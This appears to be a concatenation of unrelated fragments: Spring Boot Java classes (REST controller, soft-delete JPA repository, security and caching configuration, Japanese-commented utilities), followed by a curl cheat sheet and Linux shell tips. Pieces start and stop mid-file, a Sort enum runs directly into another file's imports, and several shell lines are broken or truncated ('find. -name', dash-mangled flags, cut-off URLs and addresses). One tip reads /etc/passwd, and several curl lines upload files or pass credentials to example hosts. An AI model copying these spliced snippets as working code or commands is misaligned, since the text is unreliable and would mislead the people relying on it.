    em.setJpaVendorAdapter(jpaVendorAdapter());
    em.setJpaPropertyMap(properties);
    return em;
  }
}
----------------------------------------------------------------------------------------
import static org.springframework.hateoas.mvc.ControllerLinkBuilder.linkTo;
import static org.springframework.hateoas.mvc.ControllerLinkBuilder.methodOn;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.hateoas.Resource;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.annotation.InitBinder;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import com.srai.model.Person;
import com.srai.model.repository.PersonRepository;

import javax.validation.Valid;

/** Simple controller to illustrate templates. */
@RestController
@RequestMapping(value = "/person")
public class PersonController {

  /** Person repository. */
  @Autowired
  private transient PersonRepository repository;

  /**
   * Person retriever.
   * @return Person
   */
  @RequestMapping(value = "/{personId}", method = RequestMethod.GET)
  @ResponseBody public ResponseEntity<?> getPerson(@PathVariable final Long personId) {
    final Person person = repository.findOne(personId);
    if (person == null) {
      return ResponseEntity.notFound().build();
    }
    final Resource<Person> resource = new Resource<Person>(person);
    resource.add(linkTo(methodOn(PersonController.class).getPerson(personId)).withSelfRel());

    return ResponseEntity.ok(resource);
  }

  /**
   * Person creation.
   * @return Person
   */
  @RequestMapping(value = "/", method = RequestMethod.POST)
  @ResponseBody public ResponseEntity<?> savePerson(@RequestBody final Person person) {
    final Person persistedPerson = repository.save(person);
    final Resource<Person> resource = new Resource<Person>(persistedPerson);
    resource.add(
        linkTo(methodOn(PersonController.class).getPerson(persistedPerson.getId())).withSelfRel()
    );
    return ResponseEntity
        .status(HttpStatus.CREATED)
        .contentType(MediaType.APPLICATION_JSON)
        .body(resource);
  }

}
----------------------------------------------------------------------------------------
import java.io.Serializable;
import java.time.LocalDateTime;

import javax.persistence.MappedSuperclass;
import javax.persistence.PrePersist;
import javax.persistence.PreUpdate;
import javax.persistence.Version;

import lombok.Data;

/**
 * 
 * <h2>BaseEntity</h2>
 * 
 * @author Kristijan Georgiev
 * 
 *         MappedSuperclass that contains all the necessary fields for using
 *         soft deletes
 *
 */

@Data
@MappedSuperclass
public class BaseEntity implements Serializable {

	private static final long serialVersionUID = 1L;

	protected static final String NOT_DELETED = "deleted_on > CURRENT_TIMESTAMP OR deleted_on IS NULL";

	@Version
	protected Long version;

	protected LocalDateTime createdOn;

	protected LocalDateTime updatedOn;

	protected LocalDateTime deletedOn;

	@PrePersist
	protected void onCreate() {
		this.createdOn = LocalDateTime.now();
		this.updatedOn = LocalDateTime.now();
	}

	@PreUpdate
	protected void onUpdate() {
		this.updatedOn = LocalDateTime.now();
	}

}


package com.paragon.mailingcontour.commons.datasource.repository;

import com.google.common.base.CaseFormat;
import org.springframework.beans.BeanUtils;
import org.springframework.beans.BeanWrapper;
import org.springframework.beans.BeanWrapperImpl;
import org.springframework.dao.EmptyResultDataAccessException;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.data.domain.Sort;
import org.springframework.data.jpa.domain.Specification;
import org.springframework.data.jpa.repository.support.JpaEntityInformation;
import org.springframework.data.jpa.repository.support.JpaEntityInformationSupport;
import org.springframework.data.jpa.repository.support.SimpleJpaRepository;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.util.Assert;

import javax.persistence.EntityManager;
import javax.persistence.Table;
import javax.persistence.TypedQuery;
import javax.persistence.UniqueConstraint;
import javax.persistence.criteria.*;
import javax.validation.ConstraintViolation;
import javax.validation.ConstraintViolationException;
import javax.validation.Validation;
import java.beans.IntrospectionException;
import java.beans.PropertyDescriptor;
import java.io.Serializable;
import java.lang.annotation.Annotation;
import java.lang.reflect.InvocationTargetException;
import java.time.LocalDateTime;
import java.util.*;
import java.util.stream.Stream;

/**
 * Custom implementation for soft deleting
 *
 * @param <T>  the class of the entity
 * @param <ID> the ID class of the entity
 */
public class SoftDeletesRepositoryImpl<T, ID extends Serializable> extends SimpleJpaRepository<T, ID> implements SoftDeletesRepository<T, ID> {
    private final JpaEntityInformation<T, ?> entityInformation;
    private final EntityManager em;
    private final Class<T> domainClass;
    private static final String DELETED_FIELD = "deletedOn";

    public SoftDeletesRepositoryImpl(final Class<T> domainClass, final EntityManager em) {
        super(domainClass, em);
        this.em = em;
        this.domainClass = domainClass;
        this.entityInformation = JpaEntityInformationSupport.getEntityInformation(domainClass, em);
    }

    @Override
    public Iterable<T> findAllActive() {
        return super.findAll(notDeleted());
    }

    @Override
    public Iterable<T> findAllActive(Sort sort) {
        return super.findAll(notDeleted(), sort);
    }

    @Override
    public Page<T> findAllActive(Pageable pageable) {
        return super.findAll(notDeleted(), pageable);
    }

    @Override
    public Iterable<T> findAllActive(final Iterable<ID> ids) {
        if (Objects.isNull(ids) || !ids.iterator().hasNext()) {
            return Collections.emptyList();
        }
        if (this.entityInformation.hasCompositeId()) {
            final List<T> results = new ArrayList<T>();
            for (final ID id : ids) {
                results.add(findOneActive(id).orElse(null));
            }
            return results;
        }
        final ByIdsSpecification<T> specification = new ByIdsSpecification<T>(this.entityInformation);
        final TypedQuery<T> query = getQuery(Specification.where(specification).and(notDeleted()), (Sort) null);
        return query.setParameter(specification.parameter, ids).getResultList();
    }

    @Override
    public Optional<T> findOneActive(final ID id) {
        return super.findOne(Specification.where(new ByIdSpecification<>(this.entityInformation, id)).and(notDeleted()));
    }

    @Override
    @Transactional
    @SuppressWarnings("unchecked")
    public <S extends T> S save(final S entity) {
        final Set<ConstraintViolation<S>> constraintViolations = Validation.buildDefaultValidatorFactory().getValidator().validate(entity);
        if (constraintViolations.size() > 0) {
            throw new ConstraintViolationException(constraintViolations.toString(), constraintViolations);
        }
        final Class<?> entityClass = entity.getClass();
        final CriteriaBuilder criteriaBuilder = em.getCriteriaBuilder();
        final CriteriaQuery<Object> criteriaQuery = criteriaBuilder.createQuery();
        final Root<?> root = criteriaQuery.from(entityClass);

        final List<Predicate> predicates = new ArrayList<>();
        if (this.entityInformation.hasCompositeId()) {
            for (final String s : this.entityInformation.getIdAttributeNames()) {
                predicates.add(criteriaBuilder.equal(root.<ID>get(s), entityInformation.getCompositeIdAttributeValue(this.entityInformation.getId(entity), s)));
            }
            predicates.add(criteriaBuilder.lessThanOrEqualTo(root.get(DELETED_FIELD), LocalDateTime.now()));
            criteriaQuery.select(root).where(predicates.toArray(new Predicate[predicates.size()]));

            final TypedQuery<Object> typedQuery = em.createQuery(criteriaQuery);
            final List<Object> resultSet = typedQuery.getResultList();
            if (resultSet.size() > 0) {
                final S result = (S) resultSet.get(0);
                BeanUtils.copyProperties(entity, result, getNullPropertyNames(entity));
                return (S) super.save(result);
            }
        }

        if (entity.getClass().isAnnotationPresent(Table.class)) {
            final Annotation a = entity.getClass().getAnnotation(Table.class);
            try {
                final UniqueConstraint[] uniqueConstraints = (UniqueConstraint[]) a.annotationType().getMethod("uniqueConstraints").invoke(a);
                if (Objects.nonNull(uniqueConstraints)) {
                    for (UniqueConstraint uniqueConstraint : uniqueConstraints) {
                        final Map<String, Object> data = new HashMap<>();
                        for (String name : uniqueConstraint.columnNames()) {
                            if (name.endsWith("_id")) {
                                name = CaseFormat.LOWER_UNDERSCORE.to(CaseFormat.LOWER_CAMEL, name.substring(0, name.length() - 3));
                            }
                            final PropertyDescriptor pd = new PropertyDescriptor(name, entityClass);
                            final Object value = pd.getReadMethod().invoke(entity);
                            if (value == null) {
                                data.clear();
                                break;
                            }
                            data.put(name, value);
                        }
                        if (!data.isEmpty())
                            for (Map.Entry<String, Object> entry : data.entrySet()) {
                                predicates.add(criteriaBuilder.equal(root.get(entry.getKey()), entry.getValue()));
                            }
                    }

                    if (predicates.isEmpty()) {
                        return super.save(entity);
                    }
                    predicates.add(criteriaBuilder.lessThanOrEqualTo(root.get(DELETED_FIELD), LocalDateTime.now()));
                    criteriaQuery.select(root).where(predicates.toArray(new Predicate[0]));

                    final TypedQuery<Object> typedQuery = em.createQuery(criteriaQuery);
                    final List<Object> resultSet = typedQuery.getResultList();
                    if (resultSet.size() > 0) {
                        final S result = (S) resultSet.get(0);
                        BeanUtils.copyProperties(
                            entity,
                            result,
                            Stream.concat(Arrays.stream(
                                getNullPropertyNames(entity)),
                                Arrays.stream(new String[]{entityInformation.getIdAttribute().getName()})).toArray(String[]::new)
                        );
                        return (S) super.save(result);
                    }
                }
            } catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException
                | NoSuchMethodException | SecurityException | IntrospectionException e) {
                e.printStackTrace();
            }
        }
        return super.save(entity);
    }

    @Override
    @Transactional
    public <S extends T> S saveAndFlush(final S entity) {
        final S result = this.save(entity);
        this.flush();
        return result;
    }

    @Transactional
    public <S extends T> List<S> save(final Iterable<S> entities) {
        final List<S> result = new ArrayList<S>();
        if (Objects.isNull(entities)) {
            return result;
        }
        for (final S entity : entities) {
            result.add(this.save(entity));
        }
        return result;
    }

    public static String[] getNullPropertyNames(Object source) {
        final BeanWrapper src = new BeanWrapperImpl(source);
        final PropertyDescriptor[] pds = src.getPropertyDescriptors();
        final Set<String> propertyNames = new HashSet<>();
        for (final PropertyDescriptor pd : pds) {
            if (!pd.getName().equals(DELETED_FIELD) && src.getPropertyValue(pd.getName()) == null) {
                propertyNames.add(pd.getName());
            }
        }
        return propertyNames.toArray(new String[0]);
    }

    @Override
    @Transactional
    public void softDelete(ID id) {
        Assert.notNull(id, "The given id must not be null!");
        this.softDelete(id, LocalDateTime.now());
    }

    @Override
    @Transactional
    public void softDelete(final T entity) {
        Assert.notNull(entity, "The entity must not be null!");
        this.softDelete(entity, LocalDateTime.now());
    }

    @Override
    @Transactional
    public void softDelete(Iterable<? extends T> entities) {
        Assert.notNull(entities, "The given Iterable of entities not be null!");
        for (final T entity : entities) {
            this.softDelete(entity);
        }
    }

    @Override
    @Transactional
    public void softDeleteAll() {
        for (final T entity : this.findAllActive())
            this.softDelete(entity);
    }

    @Override
    @Transactional
    public void scheduleSoftDelete(ID id, LocalDateTime localDateTime) {
        this.softDelete(id, localDateTime);
    }

    @Override
    @Transactional
    public void scheduleSoftDelete(T entity, LocalDateTime localDateTime) {
        this.softDelete(entity, localDateTime);
    }

    private void softDelete(final ID id, final LocalDateTime localDateTime) {
        Assert.notNull(id, "The given id must not be null!");
        final T entity = findOneActive(id).orElse(null);
        if (Objects.isNull(entity)) {
            throw new EmptyResultDataAccessException(String.format("No %s entity with id %s exists!", entityInformation.getJavaType(), id), 1);
        }
        this.softDelete(entity, localDateTime);
    }

    private void softDelete(T entity, LocalDateTime localDateTime) {
        Assert.notNull(entity, "The entity must not be null!");

        CriteriaBuilder cb = em.getCriteriaBuilder();

        CriteriaUpdate<T> update = cb.createCriteriaUpdate((Class<T>) domainClass);

        Root<T> root = update.from((Class<T>) domainClass);

        update.set(DELETED_FIELD, localDateTime);

        final List<Predicate> predicates = new ArrayList<Predicate>();

        if (entityInformation.hasCompositeId()) {
            for (String s : entityInformation.getIdAttributeNames())
                predicates.add(cb.equal(root.<ID>get(s),
                    entityInformation.getCompositeIdAttributeValue(entityInformation.getId(entity), s)));
            update.where(cb.and(predicates.toArray(new Predicate[predicates.size()])));
        } else
            update.where(cb.equal(root.<ID>get(entityInformation.getIdAttribute().getName()),
                entityInformation.getId(entity)));

        em.createQuery(update).executeUpdate();
    }

    public long countActive() {
        return super.count(notDeleted());
    }

    @Override
    public boolean existsActive(ID id) {
        Assert.notNull(id, "The entity must not be null!");
        return findOneActive(id) != null ? true : false;
    }

    private static final class ByIdSpecification<T, ID extends Serializable> implements Specification<T> {

        private final JpaEntityInformation<T, ?> entityInformation;
        private final ID id;

        public ByIdSpecification(JpaEntityInformation<T, ?> entityInformation, ID id) {
            this.entityInformation = entityInformation;
            this.id = id;
        }

        @Override
        public Predicate toPredicate(Root<T> root, CriteriaQuery<?> query, CriteriaBuilder cb) {
            final List<Predicate> predicates = new ArrayList<Predicate>();
            if (entityInformation.hasCompositeId()) {
                for (String s : entityInformation.getIdAttributeNames())
                    predicates.add(cb.equal(root.<ID>get(s), entityInformation.getCompositeIdAttributeValue(id, s)));

                return cb.and(predicates.toArray(new Predicate[predicates.size()]));
            }
            return cb.equal(root.<ID>get(entityInformation.getIdAttribute().getName()), id);
        }
    }

    @SuppressWarnings("rawtypes")
    private static final class ByIdsSpecification<T> implements Specification<T> {

        private final JpaEntityInformation<T, ?> entityInformation;

        ParameterExpression<Iterable> parameter;

        public ByIdsSpecification(JpaEntityInformation<T, ?> entityInformation) {
            this.entityInformation = entityInformation;
        }

        @Override
        public Predicate toPredicate(Root<T> root, CriteriaQuery<?> query, CriteriaBuilder cb) {
            Path<?> path = root.get(entityInformation.getIdAttribute());
            parameter = cb.parameter(Iterable.class);
            return path.in(parameter);
        }
    }

    private static final class DeletedIsNull<T> implements Specification<T> {
        @Override
        public Predicate toPredicate(Root<T> root, CriteriaQuery<?> query, CriteriaBuilder cb) {
            return cb.isNull(root.<LocalDateTime>get(DELETED_FIELD));
        }
    }

    private static final class DeletedTimeGreatherThanNow<T> implements Specification<T> {
        @Override
        public Predicate toPredicate(Root<T> root, CriteriaQuery<?> query, CriteriaBuilder cb) {
            return cb.greaterThan(root.<LocalDateTime>get(DELETED_FIELD), LocalDateTime.now());
        }
    }

    private static final <T> Specification<T> notDeleted() {
        return Specification.where(new DeletedIsNull<T>()).or(new DeletedTimeGreatherThanNow<T>());
    }
}


import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.data.domain.Sort;
import org.springframework.data.jpa.repository.Modifying;
import org.springframework.data.repository.NoRepositoryBean;
import org.springframework.data.repository.PagingAndSortingRepository;
import org.springframework.transaction.annotation.Transactional;

import java.io.Serializable;
import java.time.LocalDateTime;
import java.util.Optional;

@Transactional
@NoRepositoryBean
public interface SoftDeletesRepository<T, ID extends Serializable> extends PagingAndSortingRepository<T, ID> {

    Iterable<T> findAllActive();

    Iterable<T> findAllActive(final Sort sort);

    Page<T> findAllActive(final Pageable pageable);

    Iterable<T> findAllActive(final Iterable<ID> ids);

    Optional<T> findOneActive(final ID id);

    @Modifying
    void softDelete(final ID id);

    @Modifying
    void softDelete(final T entity);

    @Modifying
    void softDelete(final Iterable<? extends T> entities);

    @Modifying
    void softDeleteAll();

    @Modifying
    void scheduleSoftDelete(final ID id, final LocalDateTime localDateTime);

    @Modifying
    void scheduleSoftDelete(final T entity, final LocalDateTime localDateTime);

    long countActive();

    boolean existsActive(final ID id);
}
----------------------------------------------------------------------------------------
	/*
	 * (non-Javadoc)
	 * @see java.lang.Object#toString()
	 */
	@Override
	public String toString() {
		return orders.isEmpty() ? "UNSORTED" : StringUtils.collectionToCommaDelimitedString(orders);
	}

	/**
	 * Creates a new {@link Sort} with the current setup but the given order direction.
	 *
	 * @param direction
	 * @return
	 */
	private Sort withDirection(Direction direction) {

		return Sort.by(orders.stream().map(it -> new Order(direction, it.getProperty())).collect(Collectors.toList()));
	}

	/**
	 * Enumeration for sort directions.
	 *
	 * @author Oliver Gierke
	 */
	public static enum Direction {

		ASC, DESC;

		/**
		 * Returns whether the direction is ascending.
		 *
		 * @return
		 * @since 1.13
		 */
		public boolean isAscending() {
			return this.equals(ASC);
		}

		/**
		 * Returns whether the direction is descending.
		 *
		 * @return
		 * @since 1.13
		 */
		public boolean isDescending() {
			return this.equals(DESC);
		}

		/**
		 * Returns the {@link Direction} enum for the given {@link String} value.
		 *
		 * @param value
		 * @throws IllegalArgumentException in case the given value cannot be parsed into an enum value.
		 * @return
		 */
		public static Direction fromString(String value) {

			try {
				return Direction.valueOf(value.toUpperCase(Locale.US));
			} catch (Exception e) {
				throw new IllegalArgumentException(String.format(
						"Invalid value '%s' for orders given! Has to be either 'desc' or 'asc' (case insensitive).", value), e);
			}
		}

		/**
		 * Returns the {@link Direction} enum for the given {@link String} or null if it cannot be parsed into an enum
		 * value.
		 *
		 * @param value
		 * @return
		 */
		public static Optional<Direction> fromOptionalString(String value) {

			try {
				return Optional.of(fromString(value));
			} catch (IllegalArgumentException e) {
				return Optional.empty();
			}
		}
	}
	
	import org.springframework.boot.actuate.health.Health;
import org.springframework.boot.actuate.health.HealthIndicator;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @author Greg Turnquist
 */
// tag::code[]
@Component
public class LearningSpringBootHealthIndicator
						implements HealthIndicator {

	@Override
	public Health health() {
		try {
			URL url =
				new URL("http://greglturnquist.com/learning-spring-boot");
			HttpURLConnection conn =
				(HttpURLConnection) url.openConnection();
			int statusCode = conn.getResponseCode();
			if (statusCode >= 200 && statusCode < 300) {
				return Health.up().build();
			} else {
				return Health.down()
					.withDetail("HTTP Status Code", statusCode)
					.build();
			}
		} catch (IOException e) {
			return Health.down(e).build();
		}
	}
}

import org.springframework.security.config.annotation.method.configuration.EnableReactiveMethodSecurity;
import org.springframework.security.config.annotation.web.reactive.EnableWebFluxSecurity;
import org.springframework.security.config.web.server.HttpSecurity;
import org.springframework.security.web.server.SecurityWebFilterChain;
import org.springframework.security.web.server.context.WebSessionSecurityContextRepository;

/**
 * @author Greg Turnquist
 */
// tag::code[]
@EnableWebFluxSecurity
@EnableReactiveMethodSecurity
public class SecurityConfiguration {

	@Bean
	SecurityWebFilterChain springWebFilterChain() {
		return HttpSecurity.http()
			.securityContextRepository(new WebSessionSecurityContextRepository())
			.authorizeExchange()
			.anyExchange().authenticated()
			.and()
			.build();
	}
}

import org.apache.catalina.connector.Connector;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import org.springframework.beans.factory.annotation.Autowired;

import org.springframework.boot.context.embedded.tomcat.TomcatConnectorCustomizer;

import org.springframework.stereotype.Component;

/**
 * @author  jbellmann
 */
@Component
public class ProxyTomcatConnectorCustomizer implements TomcatConnectorCustomizer {

    private final Logger logger = LoggerFactory.getLogger(ProxyTomcatConnectorCustomizer.class);

    private final ProxyConnectorCustomizersProperties proxyConnectorCustomizerProperties;

    @Autowired
    public ProxyTomcatConnectorCustomizer(
            final ProxyConnectorCustomizersProperties proxyConnectorCustomizerProperties) {
        this.proxyConnectorCustomizerProperties = proxyConnectorCustomizerProperties;
    }

    @Override
    public void customize(final Connector connector) {
        if (!proxyConnectorCustomizerProperties.isEnabled()) {
            logger.warn("CUSTOMIZE CONNECTORS IS DISABLED");
            return;
        }

        for (ConnectorCustomizer cc : proxyConnectorCustomizerProperties.getCustomizers()) {

            if (cc.isEnabled()) {

                if (connector.getPort() == cc.getPort()) {
                    logger.warn("CUSTOMIZE CONNECTOR ON PORT : {}", connector.getPort());

                    logger.warn("SET CONNECTOR - 'secure' : {}", cc.isSecure());
                    connector.setSecure(cc.isSecure());

                    logger.warn("SET CONNECTOR - 'scheme' : {}", cc.getScheme());
                    connector.setScheme(cc.getScheme());

                    logger.warn("SET CONNECTOR - 'proxy-port' : {}", cc.getProxyPort());
                    connector.setProxyPort(cc.getProxyPort());

                    logger.warn("SET CONNECTOR - 'proxy-name' : {}", cc.getProxyName());
                    connector.setProxyName(cc.getProxyName());
                } else {
                    logger.info("No customizer found for connector on port : {}", connector.getPort());
                }

            }
        }
    }

}

		mockServer.expect(requestTo("https://api.github.com/orgs/zalando-stups/members?per_page=25"))
				.andExpect(method(HttpMethod.GET))
				// .andExpect(header("Authorization", "Bearer ACCESS_TOKEN"))
				.andRespond(
						withSuccess(new ClassPathResource("listMembers.json", getClass()), MediaType.APPLICATION_JSON));
----------------------------------------------------------------------------------------
curl www.likegeeks.com --output likegeeks.html

curl -L www.likegeeks.com
curl -C - example.com/some-file.zip --output MyFile.zip
curl -m 60 example.com

curl --connect-timeout 60 example.com
curl -u username:password ftp://example.com
curl -u username:password ftp://example.com/readme.txt

curl -x 192.168.1.1:8080 http://example.com
curl -x 192.168.1.1:8080 ftp://example.com/readme.txt
curl --range 0-99999999 http://releases.ubuntu.com/18.04/ubuntu-18.04.3-desktop-amd64.iso ubuntu-art1
curl --range 0-99999999 http://releases.ubuntu.com/18.04/ubuntu-18.04.3-desktop-amd64.iso
curl --range 100000000-199999999 http://releases.ubuntu.com/18.04/ubuntu-18.04.3-desktop-amd64.iso ubuntu-part2
cat ubuntu-part? > ubuntu-18.04.3-desktop-amd64.iso
curl --cert path/to/cert.crt:password ftp://example.com

curl -s -O http://example.com

curl -s http://example.com --output index.html
curl -I example.com
curl -I -L example.com
curl -H 'Connection: keep-alive' -H 'Accept-Charset: utf-8 ' http://example.c
curl -d 'name=geek&location=usa' http://example.com
curl -d @filename http://example.com
curl -T myfile.txt ftp://example.com/some/directory/
curl smtp://mail.example.com --mail-from me@example.com --mail-rcpt john@doma
curl -u username:password imap://mail.example.com
curl -u username:password imap://mail.example.com -X 'UID FETCH 1234'
----------------------------------------------------------------------------------------
mount | column –t
cat /etc/passwd | column -t -s
ps aux | sort -rnk 4
ps aux | sort -nk 3

sudo apt-get install multitail

watch df –h

nohup wget site.com/file.zip

dd if=/dev/zero of=out.txt bs=1M count=10

cat geeks.txt | tr ':[space]:' '\t' > out.txt
cat myfile | tr a-z A-Z > output.txt

find. -name *.png -type f -print | xargs tar -cvzf images.tar.gz
cat urls.txt | xargs wget
ls /etc/*.conf | xargs -i cp {} /home/likegeeks/Desktop/out
----------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.cache.CacheManager;
import org.springframework.cache.annotation.CachingConfigurerSupport;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.cache.interceptor.KeyGenerator;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.data.redis.cache.RedisCacheManager;
import org.springframework.data.redis.core.RedisTemplate;

@EnableCaching
@Configuration
public class RedisCacheConfiguration extends CachingConfigurerSupport {

    @Autowired
    @Qualifier("userRedisTemplate")
    private RedisTemplate userRedisTemplate;

    @Autowired
    @Qualifier("roleRedisTemplate")
    private RedisTemplate roleRedisTemplate;

    @Primary
    @Bean(name = "userCacheManager")
    public CacheManager userCacheManager() {
        RedisCacheManager redisCacheManager = new RedisCacheManager(userRedisTemplate);
        redisCacheManager.setDefaultExpiration(3600);
        return redisCacheManager;
    }

    @Bean(name = "roleCacheManager")
    public CacheManager roleCacheManager() {
        RedisCacheManager redisCacheManager = new RedisCacheManager(roleRedisTemplate);
        redisCacheManager.setDefaultExpiration(3600);
        return redisCacheManager;
    }

    @Bean
    @Override
    public KeyGenerator keyGenerator() {
        return (target, method, params) -> {
            StringBuilder sb = new StringBuilder();
            sb.append(target.getClass().getName());
            sb.append(method.getName());
            for (Object obj : params) {
                sb.append(obj.toString());
            }
            return sb.toString();
        };
    }
}
----------------------------------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8"?>
<config
    xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
    xmlns='http://www.ehcache.org/v3'
    xmlns:jsr107='http://www.ehcache.org/v3/jsr107'
    xsi:schemaLocation="
        http://www.ehcache.org/v3 http://www.ehcache.org/schema/ehcache-core-3.0.xsd
        http://www.ehcache.org/v3/jsr107 http://www.ehcache.org/schema/ehcache-107-ext-3.0.xsd">
   
  <service>
    <jsr107:defaults enable-management="false" enable-statistics="false"/>
  </service>

  <cache-template name="default">
    <expiry>
      <ttl unit="seconds">1800</ttl>
    </expiry>
    <resources>
      <heap unit="entries">1000</heap>
    </resources>
  </cache-template>

  <!-- ### Component Method ### -->

  <!-- AppSettingHandler -->
  <cache alias="AppSettingHandler.appSetting" uses-template="default"> 
    <expiry>
      <ttl unit="seconds">30</ttl>
    </expiry>
    <heap unit="entries">1000</heap>
  </cache>

  <!-- HolidayMasterAccessor -->
  <cache alias="HolidayAccessor.getHoliday" uses-template="default" />

  <!-- ### Service Method ### -->

  <!-- AccountService -->
  <cache alias="AccountService.getAccount" uses-template="default" />
  <cache alias="AccountService.getLoginByLoginId" uses-template="default" />

  <!-- MasterAdminService -->
  <cache alias="MasterAdminService.getStaff" uses-template="default">
    <heap unit="entries">100</heap>
  </cache>
  <cache alias="MasterAdminService.findStaffAuthority" uses-template="default">
    <heap unit="entries">10000</heap>
  </cache>
</config>
----------------------------------------------------------------------------------------
import java.math.BigDecimal;
import java.util.Optional;

import com.ibm.icu.text.Transliterator;

/** 各種型/文字列変換をサポートします。(ICU4Jライブラリに依存しています) */
public abstract class ConvertUtils {
    private static Transliterator ZenkakuToHan = Transliterator.getInstance("Fullwidth-Halfwidth");
    private static Transliterator HankakuToZen = Transliterator.getInstance("Halfwidth-Fullwidth");
    private static Transliterator KatakanaToHira = Transliterator.getInstance("Katakana-Hiragana");
    private static Transliterator HiraganaToKana = Transliterator.getInstance("Hiragana-Katakana");

    /** 例外無しにLongへ変換します。(変換できない時はnull) */
    public static Long quietlyLong(Object value) {
        try {
            return Optional.ofNullable(value).map(v -> Long.parseLong(v.toString())).orElse(null);
        } catch (NumberFormatException e) {
            return null;
        }
    }

    /** 例外無しにIntegerへ変換します。(変換できない時はnull) */
    public static Integer quietlyInt(Object value) {
        try {
            return Optional.ofNullable(value).map(v -> Integer.parseInt(v.toString())).orElse(null);
        } catch (NumberFormatException e) {
            return null;
        }
    }

    /** 例外無しにBigDecimalへ変換します。(変換できない時はnull) */
    public static BigDecimal quietlyDecimal(Object value) {
        try {
            return Optional.ofNullable(value).map((v) -> new BigDecimal(v.toString())).orElse(null);
        } catch (NumberFormatException e) {
            return null;
        }
    }

    /** 例外無しBooleanへ変換します。(変換できない時はfalse) */
    public static Boolean quietlyBool(Object value) {
        return Optional.ofNullable(value).map((v) -> Boolean.parseBoolean(v.toString())).orElse(false);
    }

    /** 全角文字を半角にします。 */
    public static String zenkakuToHan(String text) {
        return Optional.ofNullable(text).map((v) -> ZenkakuToHan.transliterate(v)).orElse(null);
    }

    /** 半角文字を全角にします。 */
    public static String hankakuToZen(String text) {
        return Optional.ofNullable(text).map((v) -> HankakuToZen.transliterate(v)).orElse(null);
    }

    /** カタカナをひらがなにします。 */
    public static String katakanaToHira(String text) {
        return Optional.ofNullable(text).map((v) -> KatakanaToHira.transliterate(v)).orElse(null);
    }

    /**
     * ひらがな/半角カタカナを全角カタカナにします。
     * <p>low: 実際の挙動は厳密ではないので単体検証(ConvertUtilsTest)などで事前に確認して下さい。
     */
    public static String hiraganaToZenKana(String text) {
        return Optional.ofNullable(text).map((v) -> HiraganaToKana.transliterate(v)).orElse(null);
    }

    /**
     * ひらがな/全角カタカナを半角カタカナにします。
     * <p>low: 実際の挙動は厳密ではないので単体検証(ConvertUtilsTest)などで事前に確認して下さい。
     */
    public static String hiraganaToHanKana(String text) {
        return zenkakuToHan(hiraganaToZenKana(text));
    }

    /** 指定した文字列を抽出します。(サロゲートペア対応) */
    public static String substring(String text, int start, int end) {
        if (text == null)
            return null;
        int spos = text.offsetByCodePoints(0, start);
        int epos = text.length() < end ? text.length() : end;
        return text.substring(spos, text.offsetByCodePoints(spos, epos - start));
    }

    /** 文字列を左から指定の文字数で取得します。(サロゲートペア対応) */
    public static String left(String text, int len) {
        return substring(text, 0, len);
    }
	

    /** 文字列を左から指定のバイト数で取得します。 */
    public static String leftStrict(String text, int lenByte, String charset) {
        StringBuilder sb = new StringBuilder();
        try {
            int cnt = 0;
            for (int i = 0; i < text.length(); i++) {
                String v = text.substring(i, i + 1);
                byte[] b = v.getBytes(charset);
                if (lenByte < cnt + b.length) {
                    break;
                } else {
                    sb.append(v);
                    cnt += b.length;
                }
            }
        } catch (Exception e) {
            throw new IllegalArgumentException(e);
        }
        return sb.toString();
    }

}
----------------------------------------------------------------------------------------
import java.io.Serializable;
import java.util.*;

import lombok.Value;

/**
 * 審査例外を表現します。
 * <p>ValidationExceptionは入力例外や状態遷移例外等の復旧可能な審査例外です。
 * その性質上ログ等での出力はWARNレベル(ERRORでなく)で行われます。
 * <p>審査例外はグローバル/フィールドスコープで複数保有する事が可能です。複数件の例外を取り扱う際は
 * Warnsを利用して初期化してください。
 */
public class ValidationException extends RuntimeException {

    private static final long serialVersionUID = 1L;

    private final Warns warns;

    /** フィールドに従属しないグローバルな審査例外を通知するケースで利用してください。 */
    public ValidationException(String message) {
        super(message);
        warns = Warns.init(message);
    }

    /** フィールドに従属する審査例外を通知するケースで利用してください。 */
    public ValidationException(String field, String message) {
        super(message);
        warns = Warns.init(field, message);
    }

    /** フィールドに従属する審査例外を通知するケースで利用してください。 */
    public ValidationException(String field, String message, String[] messageArgs) {
        super(message);
        warns = Warns.init(field, message, messageArgs);
    }

    /** 複数件の審査例外を通知するケースで利用してください。 */
    public ValidationException(final Warns warns) {
        super(warns.head().map((v) -> v.getMessage()).orElse(ErrorKeys.Exception));
        this.warns = warns;
    }

    /** 発生した審査例外一覧を返します。*/
    public List<Warn> list() {
        return warns.list();
    }

    @Override
    public String getMessage() {
        return warns.head().map((v) -> v.getMessage()).orElse(ErrorKeys.Exception);
    }

    /** 審査例外情報です。  */
    public static class Warns implements Serializable {
        private static final long serialVersionUID = 1L;
        private List<Warn> list = new ArrayList<>();

        private Warns() {
        }

        public Warns add(String message) {
            list.add(new Warn(null, message, null));
            return this;
        }

        public Warns add(String field, String message) {
            list.add(new Warn(field, message, null));
            return this;
        }

        public Warns add(String field, String message, String[] messageArgs) {
            list.add(new Warn(field, message, messageArgs));
            return this;
        }

        public Optional<Warn> head() {
            return list.isEmpty() ? Optional.empty() : Optional.of(list.get(0));
        }

        public List<Warn> list() {
            return list;
        }

        public boolean nonEmpty() {
            return !list.isEmpty();
        }

        public static Warns init() {
            return new Warns();
